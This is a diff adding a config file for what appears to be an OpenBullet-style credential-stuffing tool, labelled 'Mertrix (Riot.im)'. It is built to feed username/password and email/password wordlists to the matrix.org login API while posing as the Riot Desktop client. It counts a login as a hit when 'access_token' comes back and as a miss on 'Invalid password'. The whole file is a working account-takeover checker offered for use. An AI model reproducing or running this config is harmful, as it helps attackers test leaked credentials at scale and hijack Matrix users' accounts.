@@ -1,0 +1,36 @@
+[SETTINGS]
+{
+  "Name": "Mertrix (Riot.im)",
+  "SuggestedBots": 1,
+  "LastModified": "2018-05-12T17:16:29.6241084+00:00",
+  "AdditionalInfo": "",
+  "Author": "Choempie",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://matrix.org/_matrix/client/r0/login?" AutoRedirect=TRUE 
+  CONTENT "{\"type\":\"m.login.password\",\"password\":\"<PASS>\",\"identifier\":{\"type\":\"m.id.user\",\"user\":\"<USER>\"},\"initial_device_display_name\":\"Riot Desktop on Windows\",\"user\":\"<USER>\"}" 
+  CONTENTTYPE "text/plain;charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Riot/0.14.2 Chrome/59.0.3071.115 Electron/1.8.4 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid password" 
